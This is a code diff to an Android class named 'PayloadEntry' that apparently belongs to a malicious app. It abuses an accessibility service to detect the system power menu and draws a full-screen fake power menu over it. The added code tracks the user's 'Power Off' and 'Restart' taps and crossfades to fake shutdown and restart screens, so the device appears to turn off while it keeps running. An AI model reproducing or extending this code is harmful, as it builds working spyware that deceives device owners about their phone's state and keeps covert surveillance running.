@@ -48,64 +48,73 @@ class PayloadEntry : DynamicEntry {
 
         LaunchedEffect(Unit) {
             DynamicEntry.log("📡 Ghost active. Monitoring SystemUI hooks...")
+            var isInjectionScheduled = false
             
             DynamicEntry.accessibilityInterceptor = { event ->
                 val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                 val hasPowerMenu = root?.let { checkNodes(it) } ?: false
                 
                 if (hasPowerMenu) {
-                    if (DynamicEntry.overlayContent == null) {
+                    if (DynamicEntry.overlayContent == null && !isInjectionScheduled) {
+                        isInjectionScheduled = true
                         DynamicEntry.log("🎯 TARGET DETECTED: Scheduling Injection")
                         
                         // Strategic Delay: Let the system window settle first
                         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            isInjectionScheduled = false
                             DynamicEntry.overlayContent = {
-                                val tapOffsets = remember { mutableStateListOf<Offset>() }
+                                var currentScreen by remember { mutableStateOf(0) }
                                 
-                                Box(
-                                    modifier = Modifier
-                                        .fillMaxSize()
-                                        .background(Color.Black)
-                                        .pointerInput(Unit) {
-                                            detectTapGestures { offset ->
-                                                tapOffsets.add(offset)
-                                                DynamicEntry.log("🎯 TAP #${tapOffsets.size} DETECTED at X: ${offset.x.roundToInt()}, Y: ${offset.y.roundToInt()}")
-                                            }
-                                        }
-                                ) {
-                                    if (fakeMenuBitmap != null) {
-                                        Image(
-                                            bitmap = fakeMenuBitmap,
-                                            contentDescription = null,
-                                            modifier = Modifier.fillMaxSize(),
-                                            contentScale = ContentScale.FillBounds
-                                        )
-                                    }
-                                    
-                                    Canvas(modifier = Modifier.fillMaxSize()) {
-                                        tapOffsets.forEachIndexed { index, offset ->
-                                            drawCircle(
-                                                color = Color.Red,
-                                                radius = 150f,
-                                                center = offset,
-                                                alpha = 0.5f
-                                            )
-                                            drawCircle(
-                                                color = Color.White,
-                                                radius = 150f,
-                                                center = offset,
-                                                style = Stroke(width = 5f)
-                                            )
-                                            drawContext.canvas.nativeCanvas.drawText(
-                                                "${index + 1}",
-                                                offset.x,
-                                                offset.y + 25f,
-                                                android.graphics.Paint().apply {
-                                                    color = android.graphics.Color.WHITE
-                                                    textSize = 75f
-                                                    textAlign = android.graphics.Paint.Align.CENTER
-                                                    isFakeBoldText = true
+                                val powerBitmap = remember(resDir) {
+                                    try { BitmapFactory.decodeFile(File(resDir, "power.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
+                                }
+                                val restartBitmap = remember(resDir) {
+                                    try { BitmapFactory.decodeFile(File(resDir, "restart.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
+                                }
+
+                                Crossfade(
+                                    targetState = currentScreen, 
+                                    animationSpec = tween(durationMillis = 300), 
+                                    label = "MenuTransition"
+                                ) { screen ->
+                                    Box(
+                                        modifier = Modifier
+                                            .fillMaxSize()
+                                            .background(Color.Black)
+                                            .pointerInput(Unit) {
+                                                detectTapGestures { offset ->
+                                                    if (screen == 0) {
+                                                        // Power Off (Tap 1) -> 290, 747
+                                                        val dxP = offset.x - 290f
+                                                        val dyP = offset.y - 747f
+                                                        if (dxP * dxP + dyP * dyP < 200f * 200f) {
+                                                            DynamicEntry.log("🔘 Power Off Tapped. Crossfading...")
+                                                            currentScreen = 1
+                                                        }
+                                                        
+                                                        // Restart (Tap 2) -> 774, 803
+                                                        val dxR = offset.x - 774f
+                                                        val dyR = offset.y - 803f
+                                                        if (dxR * dxR + dyR * dyR < 200f * 200f) {
+                                                            DynamicEntry.log("🔄 Restart Tapped. Crossfading...")
+                                                            currentScreen = 2
+                                                        }
+                                                    }
                                                 }
+                                            }
+                                    ) {
+                                        val activeBitmap = when(screen) {
+                                            1 -> powerBitmap
+                                            2 -> restartBitmap
+                                            else -> fakeMenuBitmap
+                                        }
+                                        
+                                        if (activeBitmap != null) {
+                                            Image(
+                                                bitmap = activeBitmap,
+                                                contentDescription = null,
+                                                modifier = Modifier.fillMaxSize(),
+                                                contentScale = ContentScale.FillBounds
                                             )
                                         }
                                     }
@@ -115,8 +124,9 @@ class PayloadEntry : DynamicEntry {
                         }, 150)
                     }
                 } else {
-                    if (DynamicEntry.overlayContent != null) {
+                    if (DynamicEntry.overlayContent != null || isInjectionScheduled) {
                         DynamicEntry.overlayContent = null
+                        isInjectionScheduled = false
                         DynamicEntry.log("📉 TARGET LOST: Cleaning stack.")
                     }
                 }
